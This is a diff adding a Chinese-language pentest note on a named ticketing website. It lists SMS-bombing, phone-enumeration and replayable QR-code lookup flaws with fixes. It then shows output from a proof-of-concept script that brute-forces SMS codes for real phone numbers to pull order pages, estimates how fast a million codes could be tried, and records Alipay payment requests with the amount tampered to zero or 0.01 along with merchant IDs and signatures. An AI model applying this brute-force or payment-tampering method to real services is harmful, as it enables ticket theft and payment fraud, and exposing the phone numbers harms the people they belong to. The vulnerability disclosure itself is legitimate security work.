@@ -1,0 +1,51 @@
+
+通过了对于商品进行签名，解决了价格更改的问题：
+
+存在的问题：
+
+1.同一个手机没有限制发送短信的次数，容易被用来发送短信炸弹，导致短信通道被关闭
+
+2.通过请求短信发送接口，根据返回的信息可以探测是否存在注册手机号
+
+3.可以重放电子码查询请求，盗取二维码
+
+
+修复方案：
+
+1.限制同一手机每天发送短信次数
+
+2.模糊化返回结果信息
+
+3.限制对同一手机号查询的次数
+
+joeydeMacBook-Pro-2:cdcz joey$ ./cdcz_order_poc.py 15528283816
+phone:15528283 done at code:707690
+order info:http://m.cdms.sjcxhz.com/1/../Region/Success?mark=1&orderid=fx2ygdPYg%2bs%3d
+joeydeMacBook-Pro-2:cdcz joey$ time ./cdcz_order_poc.py 15828273600
+phone:15828273xxx ,done at code:940664
+order info:http://m.cdms.sjcxhz.com/1/../Region/Success?mark=1&orderid=YRHEkBsNXlQ%3d
+
+real	0m4.980s
+user	0m1.222s
+sys	0m0.533s
+
+400个数字，20个线程，5秒完成。
+如果是100万，200个线程，20分钟可以完成。
+
+
+purchse:http://m.cdms.sjcxhz.com/region/region?code=021fbbe4cb86275e93dc81f1ed781a6r&state=STATE
+
+
+mobile=15828273600&psnname=%E4%B8%93%E4%B8%9A%E8%A7%82%E4%BC%97%E7%A5%A8&price=70&ordernum=1&payamount=66.5&paytype=Ali&psnid=439
+
+//Pay/Alipay?aliUrl=_input_charset%3dutf-8%26notify_url%3dhttp%3a%2f%2fm.cdms.sjcxhz.com%2fPay%2fAliNotifyUrl%26out_trade_no%3d414%26partner%3d2088511051540893%26payment_type%3d1%26return_url%3dhttp%3a%2f%2fm.cdms.sjcxhz.com%2fPay%2fAliReturnUrl%26seller_id%3d2088511051540893%26service%3dalipay.wap.create.direct.pay.by.user%26sign%3d5676de0303effe7a223e176a329e9cfc%26sign_type%3dMD5%26subject%3d%e4%b8%93%e4%b8%9a%e8%a7%82%e4%bc%97%e7%a5%a8%26total_fee%3d0
+
+http://zhidao.baidu.com/link?url=H0yTb9wzsu9p5G3BdTiyjYn9CuoMvh0k7giE6Q04UTgXKftdvapaFCFu9QKLAIi9wHHSHSKmucSqhmh7uVYoYK
+%3d：=符号 %26: &符号
+sign=5676de0303effe7a223e176a329e9cfc&sign_type=MD5&subject=%e4%b8%93%e4%b8%9a%e8%a7%82%e4%bc%97%e7%a5%a8 & total_fee=0
+
+order list:http://m.cdms.sjcxhz.com/Region/Success?mark=1&orderid=fx2ygdPYg%2bs%3d
+
+http://m.cdms.sjcxhz.com//Pay/Alipay?aliUrl=_input_charset%3dutf-8%26notify_url%3dhttp%3a%2f%2fm.cdms.sjcxhz.com%2fPay%2fAliNotifyUrl%26out_trade_no%3d415%26partner%3d2088511051540893%26payment_type%3d1%26return_url%3dhttp%3a%2f%2fm.cdms.sjcxhz.com%2fPay%2fAliReturnUrl%26seller_id%3d2088511051540893%26service%3dalipay.wap.create.direct.pay.by.user%26sign%3dc65fd4d3b40354b6cddb38b71d44e7e5%26sign_type%3dMD5%26subject%3d%E4%B8%93%E4%B8%9A%E8%A7%82%E4%BC%97%E7%A5%A8%26total_fee%3d0.01
+
+subject%3d专业观众票
